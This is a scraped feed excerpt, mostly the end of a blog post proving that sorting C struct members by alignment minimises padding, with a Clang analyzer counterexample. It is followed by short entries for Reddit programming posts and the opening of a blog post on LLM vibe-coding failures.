arguments:</p><p>$$\n\\text{dsizeof}(S,M)\n$$</p><p>where, once again, the first argument \\(S\\) is the structure in question, and the second argument \\(M\\) is the memory address the structure starts at.</p><p>To compute an example, let's examine our structure  again, and determine what\n\\(\\text{dsizeof}(\\text{Foo}, 0)\\) ends up being:</p><pre><code> a b c</code></pre><p>This is basically the same computation as before, except we don't add the 2 bytes of trail padding,\nso we end up getting:</p><p>$$\\text{dsizeof}(\\text{Foo}, 0) = 10$$</p><p>Similarly, if we want to compute \\(\\text{dsizeof}(\\text{Foo}, 2)\\), we can recall from the\nprevious section that:</p><p>$$\n\\text{dsizeof}(\\text{Foo}, 2) = 8\n$$</p><p>Armed with some examples, let's come up with a general equation for \\(\\text{dsizeof}\\).\nLet \\(M\\) be the memory address that a structure \\(S\\) starts at. Then we can compute\n\\(\\text{dsizeof}(S,M)\\) as follows:</p><p>$$\n\\text{dsizeof}(S, M) = s_1 + p_1 + s_2 + p_2 + \\ldots + s_{n-1} + p_{n-1} + s_n\n$$</p><p>All this is really saying is that the  some structure is the sum of the\nstructure member sizes and the needed padding between those members.</p><p>However, for \\(0 \\lt i \\lt n\\), we know that \\(p_i\\) cannot be some arbitrary integer - it must satisfy two constraints.\nFirst, the choice of \\(p_i\\) must make it so the memory address of \\(m_{i+1}\\) is divisible by \\(a_{i+1}\\).\nIn other words, the padding must be chosen to make sure the memory address of the structure's next member respects that member's alignment.</p><p>If we notice that the expression \\(M + s_1 + p_1 + \\ldots + s_i + p_i\\) represents the starting memory address of member\n\\(m_{i+1}\\), we can encode this requirement recursively as:</p><p>$$\nM + s_1 + p_1 + \\ldots + s_i + p_i \\equiv 0 \\pmod{a_{i+1}}\n$$</p><p>Second, we must ensure that \\(p_i\\) is the smallest positive solution to the above equation.\nThis is because if we have some integer solution to the above equation \\(p_i=k\\), then \\(p_i=k+ca_{i+1}\\) is also a solution for any arbitrary\ninteger \\(c\\). So we add the final restriction on the value of each \\(p_i\\):</p><p>$$\n0 \\leq p_i \\lt a_{i+1}\n$$</p><p>which guarantees the uniqueness of \\(p_i\\).</p><p>As an intermediary step to proving the consistency of , we would like the prove the\nfollowing lemma:</p><p> Let \\(M\\) be any memory address evenly divisible by \\(a_\\text{max}\\), the largest alignment in \\(S\\).\nThen we have that:\n$$\n\\text{dsizeof}(S,0) = \\text{dsizeof}(S,M)\n$$</p><p> We'll need to come up with some notation to differentiate the paddings in both\nsides of the equation. For \\(0 \\lt i \\leq n-1\\), we'll write \\(p_i\\) to denote the paddings inside of\n\\(\\text{dsizeof}(S, 0)\\), and we'll write \\(b_i\\) to denote the paddings inside of \\(\\text{dsizeof}(S, M)\\).\nThus, our equations become:</p><p>$$\n\\text{dsizeof}(S, 0) = s_1 + p_1 + s_2 + p_2 + \\ldots + s_{n-1} + p_{n-1} + s_n\n$$\n$$\n\\text{dsizeof}(S, M) = s_1 + b_1 + s_2 + b_2 + \\ldots + s_{n-1} + b_{n-1} + s_n\n$$</p><p>All we need to show is that for any \\(i\\), we have \\(b_i = p_i\\), at which point we know that\n\\(\\text{dsizeof}(S, 0) = \\text{dsizeof}(S, M)\\).</p><p>First, recall our restrictions that each padding must satisfy. We know that for each \\(p_i\\) and\n\\(b_i\\):</p><p>$$\n\\begin{align}\n0 + s_1 + p_1 + \\ldots + s_i + p_i \\equiv 0 \\pmod{a_{i+1}} \\\\\nM + s_1 + b_1 + \\ldots + s_i + b_i \\equiv 0 \\pmod{a_{i+1}}\n\\end{align}\n$$\n$$\n\\begin{align*}\n0 \\leq p_i \\lt a_{i+1} \\\\\n0 \\leq b_i \\lt a_{i+1}\n\\end{align*}\n$$</p><p>However, in the case of equation (2), we know that by definition \\(M\\) is divisible by the greatest alignment\n\\(a_{\\text{max}}=2^{k_{\\text{max}}}\\)\nin \\(S\\). Since we know that each \\(a_i=2^{k_i} \\leq 2^{k_{\\text{max}}}\\),\nthat means that \\(M\\) is divisible by any \\({a_i}\\), and so \\(M \\equiv 0 \\pmod{a_i}\\) for all \\(i\\).</p><p>So we can instead transform equation (2) into:</p><p>$$\n\\begin{align*}\nM + s_1 + b_1 + \\ldots + s_i + b_i \\equiv 0 \\pmod{a_{i+1}} \\\\\n0 + s_1 + b_1 + \\ldots + s_i + b_i \\equiv 0 \\pmod{a_{i+1}} \\\\\ns_1 + b_1 + \\ldots + s_i + b_i \\equiv 0 \\pmod{a_{i+1}}\n\\end{align*}\n$$</p><p>We now have the pair of equations below that we can do mathematical induction over to show that each \\(b_i = p_i\\):</p><p>$$\n\\begin{align}\ns_1 + p_1 + \\ldots + s_i + p_i \\equiv 0 \\pmod{a_{i+1}} \\\\\ns_1 + b_1 + \\ldots + s_i + b_i \\equiv 0 \\pmod{a_{i+1}}\n\\end{align}\n$$</p><p>Let's start with the case of \\(i=1\\). Then we have the equations:</p><p>$$\n\\begin{align}\ns_1 + p_1 \\equiv 0 \\pmod{a_2} \\\\\ns_1 + b_1 \\equiv 0 \\pmod{a_2}\n\\end{align}\n$$</p><p>However, since the lefthand sides of (5) and (6) are both equivalent to \\(0 \\pmod{a_2}\\), we can then write:\n$$\n\\begin{align}\ns_1 + p_1 \\equiv s_1 + b_1 \\pmod{a_2} \\\\\np_1 \\equiv b_1 \\pmod{a_2}\n\\end{align}\n$$</p><p>So we know that \\(p_1\\) and \\(b_1\\) are in the same equivalence class. However, by our constraints on the padding between\nstructure members, we know that \\(0 \\leq p_1 \\lt a_2\\), and \\(0 \\leq b_1 \\lt a_2\\). From there, we know that \\(p_1=b_1\\), and we are done with the base case.</p><p>Now, we need to handle the induction step. We need to show that, for any \\(1 \\lt i \\leq n - 1\\), if \\(p_{j}=b_{j}\\) for all \\(1 \\leq j \\lt i\\), then\n\\(p_{i}=b_{i}\\). However, we can solve this by similar techniques used to prove the base case.\nRecall from equations (3) and (4) that we have:</p><p>$$\n\\begin{align*}\ns_1 + p_1 + \\ldots + s_i + p_i \\equiv 0 \\pmod{a_{i+1}} \\\\\ns_1 + b_1 + \\ldots + s_i + b_i \\equiv 0 \\pmod{a_{i+1}} \\\\\n\\end{align*}\n$$</p><p>Once again, since the lefthand sides of (3) and (4) are both equivalent to \\(0 \\pmod{a_{i+1}}\\), we can set\nthem equal to each other:</p><p>$$\n\\begin{equation}\ns_1 + b_1 + \\ldots + s_i + b_i \\equiv s_1 + p_1 + \\ldots + s_i + p_i  \\pmod{a_{i+1}}\n\\end{equation}\n$$</p><p>And by the induction step we know that \\(b_j=p_j\\) for each \\(j\\), so we can\nrewrite (9) by substituting each of the \\(b_j\\) on the lefthand side with \\(p_j\\):</p><p>$$\n\\begin{equation}\ns_1 + p_1 + \\ldots + s_i + b_i \\equiv s_1 + p_1 + \\ldots + s_i + p_i  \\pmod{a_{i+1}}\n\\end{equation}\n$$</p><p>so we can subtract the terms \\(s_1 + p_1 + \\ldots + s_i\\) from both sides of (10) to get:</p><p>$$\n\\begin{equation}\nb_i \\equiv p_i \\pmod{a_{i+1}}\n\\end{equation}\n$$</p><p>So \\(b_i\\) and \\(p_i\\) are in the same equivalence class. However, once again, because \\(0 \\leq b_i \\lt\na_{i+1}\\), and \\(0 \\leq p_i \\lt a_{i+1}\\), we know that \\(p_i=b_i\\) for any \\(i\\). That completes the induction, and since all of the paddings are\npairwise equal, we are done with the proof. </p><p>Okay, we now have a mathematical formula for \\(\\text{dsizeof}(S,M)\\) and we know it's consistent when we have\ncertain restrictions on the memory address \\(M\\). We would like to use this to come up with an\nequation for .</p><p>This should be simple enough. Since \\(\\text{dsizeof}\\) is simply  without the\ntrailing padding, we can write:</p><p>$$\n\\text{sizeof}(S,M) = \\text{dsizeof}(S,M) + p\n$$</p><p>where \\(p\\) represents the trailing padding of the structure. Once again, \\(p\\) cannot be arbitrary. If we denote by \\(a_{\\text{max}}\\) the maximum alignment\nof all structure members in \\(S\\), we must choose \\(p\\) such that \\(0 \\leq p \\lt\na_\\text{max}\\) and:</p><p>$$\nM + \\text{dsizeof}(S,M) + p \\equiv 0 \\pmod{a_\\text{max}}\n$$</p><p>so that in an array, the next instance of \\(S\\) will be aligned.</p><p>However, recall that the above statement isn't completely correct, as it assumes that the only valid\nalignment for \\(S\\) is for it to be aligned on \\(a_\\text{max}\\). As the discussion in\n<a href=\"https://sayansivakumaran.com/posts/2025/9/math-struct-packing/#a-potential-ambiguity-in-the-definition-of-sizeof\">\"A potential ambiguity in the definition of \"</a> shows,\nwe can have \"valid\" alignments of \\(S\\) that are not just the largest alignment in \\(S\\).</p><p>In order to simplify things, I will again restrict this scope of this blog post - we will only study the mathematics of\nstructures aligned on the largest alignment of their members. Thus, the equation above becomes valid again.</p><p>We finally get to the important lemma that we need before we can even begin to think about finding\nthe minima of .</p><p> Let \\(M\\) be any memory address evenly divisible by the \\(a_\\text{max}\\), the largest alignment in \\(S\\).\nThen we have that:\n$$\n\\text{sizeof}(S,0) = \\text{sizeof}(S,M)\n$$\n Expanding the definition of \\(\\text{sizeof}\\), we have:</p><p>$$\n\\begin{align}\n\\text{sizeof}(S,0) = \\text{dsizeof}(S,0) + p \\\\\n\\text{sizeof}(S,M) = \\text{dsizeof}(S,M) + b\n\\end{align}\n$$</p><p>where \\(p\\) and \\(b\\) respectively must satisfy the constraints:</p><p>$$\n\\begin{align}\n\\text{dsizeof}(S,0) + p \\equiv 0 \\pmod{a_\\text{max}} \\\\\nM + \\text{dsizeof}(S,M) + b \\equiv 0 \\pmod{a_\\text{max}}\n\\end{align}\n$$</p><p>Recall that by  we know that \\(\\text{dsizeof}(S,0)=\\text{dsizeof}(S,M)\\), so it suffices\nto show that the trailing paddings \\(p\\) and \\(b\\) are equal.</p><p>By our choice of \\(M\\), we know that \\(M \\equiv 0 \\pmod{a_\\text{max}}\\), and so with (14) and (15) we have:</p><p>$$\n\\begin{align}\n\\text{dsizeof}(S,0) + p \\equiv \\text{dsizeof}(S,M) + b \\pmod{a_\\text{max}} \\\\\np = b \\pmod{a_\\text{max}}\n\\end{align}\n$$</p><p>And since we have both \\(0 \\leq p \\lt a_\\text{max}\\) and \\(0 \\leq b \\lt a_\\text{max}\\), we know that \\(p=b\\) and we are done. </p><p>We finally have a good mathematical definition of , and we have shown that the value of\n is consistent as long as we align the structure \\(S\\) on the largest alignment of its\nmembers \\(a_\\text{max}\\). Let's try to find out when the value of  is minimized.</p><p>To keep our mathematics simple, we're going to restrict the class of structures that we study once\nmore. To start with, we're going to define a  structure as any structure where, for\neach member \\(m_i\\), we have it that \\(s_i = ca_i\\) for some \\(c \\geq 0\\). In other words, the\nsize of each structure member is a multiple of the same member's alignment.</p><p>Loosely speaking, this is a structure whose members are all primitives, and so is one of the\nsimplest structures we can reason about. Furthermore, no structure members have \"unusual alignments\"\nthat were manually given to them by the programmer through specifiers such as .</p><p>For example,  and  would be primitive structures, but  is not:</p><pre><code> first second third first second first second</code></pre><p>You might have already noticed that it is not just structures with primitive members that can be considered primitive\nstructures - structures containing fixed length arrays and nested structures qualify as well, as long as they weren't given\nunusual alignments. However, we'll get to that later.</p><p>We're going to prove an intermediary lemma. I've seen people online use this style of argument to\njustify that ordering the members of a structure from largest to smallest alignment optimizes the\nsize, albeit in a handwavy way. We'll fill in the skipped details here.</p><p> Let \\(S\\) be a primitive structure aligned on \\(a_\\text{max}\\), the largest alignment in \\(S\\).\nOrdering the members of \\(S\\) from largest to smallest alignment will minimize the value of \\(\\text{dsizeof(S, M)}\\).</p><p> Recall the definition of \\(\\text{dsizeof}(S, M)\\):</p><p>$$\n\\text{dsizeof}(S, M) = s_1 + p_1 + s_2 + p_2 + \\ldots + s_{n-1} + p_{n-1} + s_n \\\n$$</p><p>It suffices to show that ordering the members of \\(S\\) from the largest to smallest alignment\nwill make each of the intermediary paddings \\(p_i=0\\), for \\(0 \\lt i \\leq n-1\\). We do this by mathematical induction.</p><p>First, we prove the base case. We want to show that if we choose an ordering of structure members such that \\(a_1 \\geq a_2\\),\nthen \\(p_1=0\\), where \\(p_1\\) must satisfy:</p><p>$$\n\\begin{align}\nM + s_1 + p_1 \\equiv 0 \\pmod{a_2} \\\\\n0 + s_1 + p_1 \\equiv 0 \\pmod{a_2} \\\\\ns_1 + p_1 \\equiv 0 \\pmod{a_2}\n\\end{align}\n$$</p><p>However, since \\(S\\) is a primitive structure, we know that \\(s_1=c_1a_1\\) for some\npositive integer \\(c_1\\). Since \\(2^{k_1} = a_1 \\geq a_2 = 2^{k_2}\\), we know that \\(a_1\\) is evenly divisible by \\(a_2\\),\nand thus \\(s_1\\) is evenly divisible by \\(a_2\\).</p><p>However, by equation (20) we know that \\(p_1 \\equiv 0 \\pmod{a_2}\\) and since \\(0 \\leq p_1 \\lt\na_2\\) we immediately know that \\(p_1=0\\).</p><p>Next, we prove the induction step. We need to show that, for any \\(1 \\lt i \\leq n\\), if \\(p_{j}=0\\) for all \\(1 \\leq j \\lt i\\), then\n\\(p_{i}=0\\). Recall that \\(p_i\\) must satisfy the following:</p><p>$$\n\\begin{align}\nM + s_1 + p_1 + \\ldots s_{i-1} + p_{i-1} + s_i + p_i \\equiv 0 \\pmod{a_{i+1}} \\\\\n0 + s_1 + p_1 + \\ldots s_{i-1} + p_{i-1} + s_i + p_i \\equiv 0 \\pmod{a_{i+1}} \\\\\ns_1 + p_1 + \\ldots s_{i-1} + p_{i-1} + s_i + p_i \\equiv 0 \\pmod{a_{i+1}}\n\\end{align}\n$$</p><p>But since all \\(p_j=0\\), we know from equation (23) that:</p><p>$$\ns_1 + s_2 + \\ldots s_{i-1} + s_i + p_i \\equiv 0 \\pmod{a_{i+1}}\n$$</p><p>and since each \\(s_i=c_ia_i\\), we can rewrite the above as:</p><p>$$\n\\begin{equation}\nc_1a_1 + c_2a_2 + \\ldots c_{i-1}a_{i-1} + c_ia_i + p_i \\equiv 0 \\pmod{a_{i+1}}\n\\end{equation}\n$$</p><p>Recall that since we have chosen an order of structure members that goes from largest alignment to\nsmallest alignment, we also have:</p><p>$$\na_1 \\geq a_2 \\geq a_3 \\geq \\ldots \\geq a_{i-1} \\geq a_i \\geq a_{i+1}\n$$</p><p>And since each alignment is a power of two, we know that \\(a_{i+1}\\) must evenly divide\n\\(c_1a_1 + c_2a_2 + \\ldots c_{i-1}a_{i-1} + c_ia_i\\). Putting this together with equation (24)\nwe immediately know that:</p><p>$$\np_i \\equiv 0 \\pmod{a_{i+1}}\n$$</p><p>and we are done, as \\(p_i=0\\) by our constraints on \\(p_i\\). </p><p>With  in our belt, proving that ordering structure members of a primitive structure by alignment will minimize \nbecomes significantly easier.</p><p> Let \\(S\\) be a primitive structure aligned on \\(a_\\text{max}\\), the largest alignment in \\(S\\).\nOrdering the members of \\(S\\) from largest to smallest alignment will minimize the value of \\(\\text{sizeof}(S, M)\\).</p><p> Let \\(S_\\alpha\\) be the structure formed from taking the members of \\(S\\) and\nordering them from the largest to smallest alignment, and let \\(S_\\beta\\) be the structure formed from\nany permutation of the members of \\(S\\). We wish to prove that:</p><p>$$\\text{sizeof}(S_\\alpha, M) \\leq \\text{sizeof}(S_\\beta, M)$$</p><p>Expanding the definition of \\(\\text{sizeof}\\), we know that:</p><p>$$\n\\begin{align}\n\\text{sizeof}(S_\\alpha,M) = \\text{dsizeof}(S_\\alpha,M) + p_\\alpha \\\\\n\\text{sizeof}(S_\\beta,M) = \\text{dsizeof}(S_\\beta,M) + p_\\beta\n\\end{align}\n$$</p><p>Furthermore, by our constraints on the tail padding \\(p_\\alpha\\), we know that:</p><p>$$\n\\begin{align}\nM + \\text{dsizeof}(S_\\alpha,M) + p_\\alpha \\equiv 0 \\pmod{a_\\text{max}} \\\\\n\\text{dsizeof}(S_\\alpha,M) + p_\\alpha \\equiv 0 \\pmod{a_\\text{max}} \\\\\n\\end{align}\n$$</p><p>However, if we notice the lefthand side of equation (28) is just the definition of \\(\\text{sizeof}(S_\\alpha, M)\\), we\nknow that:</p><p>$$\n\\text{sizeof}(S_\\alpha, M) \\equiv 0 \\pmod{a_\\text{max}}\n$$</p><p>And in particular, it means that \\(\\text{sizeof}(S_\\alpha,M) = c_{\\alpha}a_\\text{max}\\) for some positive integer\n\\(c_\\alpha\\). By a similar argument, we can conclude that \\(\\text{sizeof}(S_\\beta,M) = c_{\\beta}a_\\text{max}\\) for\nsome positive integer \\(c_\\beta\\).</p><p>However, recall that \\(0 \\leq p_\\alpha \\lt a_\\text{max}\\), and \\(0 \\leq p_\\beta \\lt\na_\\text{max}\\). We can put this information together with equation (28) to notice that:</p><p>$$\n\\begin{equation}\n(c_{\\alpha} - 1)a_\\text{max} \\lt \\text{dsizeof}(S_\\alpha, M) \\leq c_{\\alpha}a_\\text{max}\n\\end{equation}\n$$</p><p>and we can copy-paste that argument to come to a similar conclusion about \\(\\text{dsizeof}(S_\\beta,\nM)\\):</p><p>$$\n\\begin{equation}\n(c_{\\beta} - 1)a_\\text{max} \\lt \\text{dsizeof}(S_\\beta, M) \\leq c_{\\beta}a_\\text{max}\n\\end{equation}\n$$</p><p>By , we know that \\(\\text{dsizeof}(S_\\alpha, M) \\leq \\text{dsizeof}(S_\\beta, M)\\), and if\nwe put that together with equations (29) and (30) we know that:</p><p>$$\n\\begin{gather}\n(c_{\\alpha} - 1)a_\\text{max} \\lt \\text{dsizeof}(S_\\alpha, M) \\leq \\text{dsizeof}(S_\\beta, M) \\leq c_{\\beta}a_\\text{max} \\\\\n(c_{\\alpha} - 1)a_\\text{max} \\lt c_{\\beta}a_\\text{max} \\\\\n(c_{\\alpha} - 1) \\lt c_{\\beta}\n\\end{gather}\n$$</p><p>And since \\(c_{\\alpha}\\) is the smallest integer greater than \\(c_{\\alpha} - 1\\), we in particular\nhave that \\(c_{\\alpha} \\leq c_{\\beta}\\). Thus:</p><p>$$\n\\text{sizeof}(S_\\alpha,M) = c_{\\alpha}a_\\text{max} \\leq c_{\\beta}a_\\text{max} =\n\\text{sizeof}(S_\\beta,M)\n$$</p><p>and we are done with the proof. </p><p>Remember that our only requirement for a structure to be a primitive structure is that\nall members \\(m_i\\) satisfy \\(s_i = ca_i\\) for some \\(c \\geq 0\\).</p><p>If a member is a primitive data type, these conditions are surely true. But these conditions also\nhold if a structure member is a structure itself. This is because the starting address of a\nstructure \\(S\\) is always some multiple of \\(a_\\text{max}\\), and since we choose trailing\npadding for the structure so that the structure ends on a multiple of \\(a_\\text{max}\\), the\ndifference between the starting and ending memory addresses of \\(S\\) reveals that the size of\n\\(S\\) is also a multiple of \\(a_\\text{max}\\).</p><p>The above conditions also hold true if a structure member is a fixed length array of primitive\nmembers. This is because the alignment of the array is just the alignment of the primitive member\nitself, and the size of the array is just a multiple of the size of the primitive member.</p><p>In other words,  is applicable to a wider variety of structures than just those whose\nmembers are primitive data types.</p><p>It's easy to generate a counter example for why the 'ordering by alignment' algorithm doesn't always\nminimize the size of a structure. For example, consider the following structure on a 32-bit system:</p><p>It is clear that the members are sorted by alignment, but we can find a layout of  that is\nsmaller than the layout found previously:</p><p>This might imply that some kind of \"gap-filling\" algorithm would always give the optimal output.\nHowever, you have to be careful here - it is possible that \"filling the gap\" earlier might result in\nan unfillable gap later that's larger than the gap we were trying to fill. Clang attempts to write\nan algorithm like this, and while it's mostly correct, we can still find structures where it fails\nto find the optimal size.</p><p>First, here is the promised counterexample on x86-64. The construction is admittedly contrived, and I'm not\nsure if there are any real life structures that would have a shape similar to it. In\nany case, we know that Clang's algorithm is not always correct (but is probably good enough for the\nvast majority of usecases).</p><p>I tried to get the static checkers working in Godbolt, but failed to for some reason.\nSo I hope you'll be willing to try this on your own machine.</p><pre><code> id flags foo bar blah id foo bar blah flags firstChar firstDouble secondChar</code></pre><p>To run the  padding checker, you can invoke the following command, assuming you copied the\nabove code into the file :</p><pre><code>clang  -analyzer-checkeroptin.performance.Padding  -analyzer-config  optin.performance.Padding:AllowedPad  main.c</code></pre><p>On my x86-64 machine, when using clang version 20.1.8, notice how there are only warnings for the structure , and none for :</p><pre><code>$ clang  -analyzer-checkeroptin.performance.Padding  -analyzer-config  optin.performance.Padding:AllowedPad  main.c\nmain.c:24:8: warning: Excessive padding  padding bytes, where  is optimal. Optimal fields order: firstDouble, firstChar, secondChar, consider reordering the fields or adding explicit padding members optin.performance.Padding struct Baz  ~~~~~~~^~~~~\n        char firstChar     ~~~~~~~~~~~~~~~\n        double firstDouble     ~~~~~~~~~~~~~~~~~~~\n        char secondChar     ~~~~~~~~~~~~~~~~\n    ~\n warning generated.</code></pre><p>However, if you run the compiled binary, we can see that  is clearly larger than , and\nthe static analyzer did not realize that there existed a smaller layout for :</p><p>There were a couple of interesting questions to explore, but I decided against including them in\nthis blog post as it was already getting long.</p><p>While we gave a counterexample to the correctness of Clang's algorithm, it would be interesting to\nmathematically characterize a group of structures where Clang's algorithm can always minimize their\nsize. It would be interesting to try and analyze the algorithm of  as well, although I\nvaguely remember it not accounting for  specifiers (you should double check, I could be\nremembering incorrectly).</p><p>Furthermore, the problem of reordering field members to minimize size is clearly not unique to C.\nIt would be interesting to:</p><ul><li>Analyze the ability of <a href=\"https://github.com/openjdk/jdk/blob/master/src/hotspot/share/classfile/fieldLayoutBuilder.cpp\">Java's layout algorithm</a> to minimize size\n<ul><li>As mentioned earlier, it seems like most research into Java layout organization seems to favor layouts that are friendly to the access patterns of the program.\nThis is probably better for performance than purely trying to minimize size, and so perhaps this\nline of questioning isn't useful.</li></ul></li><li>Try to come up with a layout algorithm for C++ classes, and characterize what kind of data\nstructures it will create an optimal layout for.\n<ul><li>This might be trivial to do once we know how to optimize a C structure layout, but I don't\nreally know enough about the memory layout of C++ classes to say.</li></ul></li></ul><p>Earlier, we noticed that there are other valid alignments for a structure \\(S\\) that is not just \\(a_\\text{max}\\).\nIn particular, in our discussion in <a href=\"https://sayansivakumaran.com/posts/2025/9/math-struct-packing/#a-potential-ambiguity-in-the-definition-of-sizeof\">\"A potential ambiguity in the definition of sizeof\"</a>, we saw\nthat a given layout of  could be denser depending on what memory address we started it out on.</p><p>It turned out to not be useful in that case because we found a layout of  that was just as\ndense at \\(M \\equiv 0 \\pmod{4}\\) as the initial layout of  was at \\(M \\equiv 2\n\\pmod{4}\\). However, this begs another question.</p><p>Suppose that a structure \\(S\\) has \"valid alignments\" at both memory addresses \\(M_\\alpha\\) and\n\\(M_\\beta\\) such that:</p><p>$$\n\\begin{gather*}\nM_\\alpha \\equiv 0 \\pmod{a_\\text{max}} \\\\\nM_\\beta \\equiv b \\pmod{c}\n\\end{gather*}\n$$</p><p>for some positive integers \\(b\\) and \\(c\\). Is it true that the minimal size that we\ncould find when starting \\(S\\) at \\(M_\\alpha\\) is equal to the minimal size that we could find\nwhen starting \\(S\\) at \\(M_\\beta\\)? Can we ever find denser/smaller layouts of \\(S\\) at\n\\(M_\\beta\\) than we could at \\(M_\\alpha\\)?</p><p>The answer to the above question might have interesting implications on how flexible memory\nallocator implementations should be!</p>","contentLength":31619,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1mvqzh5/a_brief_look_at_the_mathematics_of_structure/"},{"title":"[Media] I made a game backup manager for the Wii using Rust and egui!","url":"https://www.reddit.com/r/rust/comments/1mvqkb5/media_i_made_a_game_backup_manager_for_the_wii/","date":1755722193,"author":"/u/mq-1","guid":235885,"unread":true,"content":"   submitted by   <a href=\"https://www.reddit.com/user/mq-1\"> /u/mq-1 </a>","contentLength":27,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Introducing: gonzo! The Go based TUI log analysis CLI tool (open source)","url":"https://www.reddit.com/r/golang/comments/1mvqalf/introducing_gonzo_the_go_based_tui_log_analysis/","date":1755721604,"author":"/u/destari","guid":235854,"unread":true,"content":"<p>Hey all! We just open sourced Gonzo, a little open source TUI log analysis tool, that slurps in logs in various format (OpenTelemetry is the best one though!), and shows some nice visuals to help you figure out what your logs are doing/saying. </p><p>Feedback is welcome! Crack a ticket, submit a PR, or just enjoy. </p>","contentLength":309,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Let's make a game! 308: Fleeing combat","url":"https://www.youtube.com/watch?v=0oDPMOfLuuU","date":1755719655,"author":"/u/apeloverage","guid":234703,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1mvpegu/lets_make_a_game_308_fleeing_combat/"},{"title":"Using large-scale search to discover fast GPU kernels in Rust","url":"https://www.reddit.com/r/rust/comments/1mvoq0g/using_largescale_search_to_discover_fast_gpu/","date":1755718176,"author":"/u/jafioti","guid":235698,"unread":true,"content":"<p>I'm building a GPU compiler for automatically generating fast GPU kernels for AI models in Rust. It uses search-based compilation to achieve high performance. <a href=\"https://github.com/luminal-ai/luminal\">https://github.com/luminal-ai/luminal</a></p><p>It takes high level model code, like you'd have in PyTorch, and generate very fast GPU code. We do that without using LLMs or AI - rather, we pose it as a search problem. Our compiler builds a search space, generates millions of possible kernels, and then searches through it to minimize runtime.</p><p>You can try out a demo in `demos/matmul` on mac to see how Luminal takes a naive operation, represented in our IR of 12 simple operations, and compiles it to an optimized, tensor-core enabled Metal kernel. Here’s a video showing how: <a href=\"https://youtu.be/P2oNR8zxSAA\">https://youtu.be/P2oNR8zxSAA</a></p><p>Our approach differs significantly from traditional ML libraries in that we ahead-of-time compile everything, generate a large search space of logically-equivalent kernels, and search through it to find the fastest kernels. This allows us to leverage the Bitter Lesson to discover complex optimizations like Flash Attention entirely automatically without needing manual heuristics. The best rule is no rule, the best heuristic is no heuristic, just search everything.</p><p>We’re working on bringing CUDA support up to parity with Metal, adding more flexibility to the search space, adding full-model examples (like Llama), and adding very exotic hardware backends.</p><p>The aim is to radically simplify the ML ecosystem while improving performance and hardware utilization. The entire library is statically compiled into a single Rust binary. Please check out our repo above and I’d love to hear your thoughts!</p>","contentLength":1658,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"What happens when an arbitrary integer is stored in a Go pointer?","url":"https://www.reddit.com/r/golang/comments/1mvnpoo/what_happens_when_an_arbitrary_integer_is_stored/","date":1755715965,"author":"/u/Prestigious_Roof_902","guid":235672,"unread":true,"content":"<p>Will this cause undefined behavior in the garbage collector? For example say you are calling a C function that may store integers in a returned pointer and you don't de reference the pointer of course but you keep it in some local variable and the garbage collector gets triggered, could this cause issues?</p>","contentLength":306,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"[R] What do people expect from AI in the next decade across various domains? Survey with N=1100 people from Germay::We found high likelihood, higher perceived risks, yet limited benefits low perceived value. Yet, benefits outweight risks in forming value judgments. Visual result illustrations :)","url":"https://www.reddit.com/r/MachineLearning/comments/1mvmlbw/r_what_do_people_expect_from_ai_in_the_next/","date":1755713554,"author":"/u/lipflip","guid":234704,"unread":true,"content":"<p>Hi everyone, we recently published a peer-reviewed article exploring how people perceive artificial intelligence (AI) across different domains (e.g., autonomous driving, healthcare, politics, art, warfare). The study used a nationally representative sample in Germany (N=1100) and asked participants to evaluate 71 AI-related scenarios in terms of expected likelihood, risks, benefits, and overall value.</p><p> People often see AI scenarios as likely, but this doesn’t mean they view them as beneficial. In fact, most scenarios were judged to have high risks, limited benefits, and low overall value. Interestingly, we found that people’s value judgments were almost entirely explained by risk-benefit tradeoffs (96.5% variance explained, with benefits being more important for forming value judgements than risks), while expectations of likelihood didn’t matter much. </p><p> These results highlight how important it is to communicate concrete benefits while addressing public concerns. Something relevant for policymakers, developers, and anyone working on AI ethics and governance. </p><p>If you’re interested, here’s the full article: Mapping Public Perception of Artificial Intelligence: Expectations, Risk-Benefit Tradeoffs, and Value As Determinants for Societal Acceptance, Technological Forecasting and Social Change (2025), </p>","contentLength":1324,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Vibe Coding Experiment Failures","url":"https://inventwithpython.com/blog/vibe-coding-failures.html","date":1755713155,"author":"/u/AlSweigart","guid":234745,"unread":true,"content":"<p>Over the past week I've been experimenting with : asking LLMs such as ChatGPT, Claude, and Gemini write entire apps as if I had absolutely no programming ability at all. LLMs can easily solve programming challenges or interview questions. But I wanted to see how far the current LLMs can go when asked to make complete apps, and what kinds of failure patterns emerge. From the role of a non-programmer, I would only be able to fix bugs by describing them to the LLM. For simplicity, I choose small apps written in Python that use only the standard library and the tkinter package for the GUI. This blog post details the failures: the kinds of apps that AI just isn't capable of making.</p><p>I'll update this blog post as I find new examples.</p><p>I don't care about polished or beautiful user interfaces (they are restricted to using tkinter after all.) I want to know if the generated app actually works without significant errors. For these experiments I'm using ChatGPT 5, Gemini 2.5 Pro, and Claude Sonnet 4.</p><p>I've included the source for some of the programs that the LLMs produced. If you do manage to get a working version of any of these ideas, I'd love to hear about the results: <a href=\"https://inventwithpython.com/cdn-cgi/l/email-protection#b5d4d9f5dcdbc3d0dbc1c2dcc1ddc5ccc1dddadb9bd6dad8\"></a>.</p><h2>Failure Patterns in LLM-Generated Apps</h2><p>LLMs tended to fail to create software with these qualities:</p><ol><li>Slightly unusual. Any app that hasn't been implement hundreds of times before (Tetris, stopwatch, to-do list, etc.)</li><li>Require spacial or visual qualities. LLMs generate text, but dealing with coordinates or drawing tended to fall apart.</li><li>Similar but not identical to common apps. When asked to create pinball, it would create pong. When asked to create the amorphous blobs of a lava lamp, it draws perfect circles. LLMs would regress to common but inaccurate examples, sometimes even in spite of specifric instructions not to.</li></ol><h2>List of Failed Vibe Coding Experiments</h2><p>One of the LLMs got something approximate to Africa, and it also drew Madagascar (after I reminded it that Madagascar is part of Africa.) The shapes of countries are not... accurate. I instructed them to do web searches for SVG files of maps of Africa. They said they did, and then would draw another potato.</p><p>In one case, the left flipper was incorrectly positioned but flipped the correct way, while the right flipper was correctly positioned but flipped the wrong way.</p><p><a 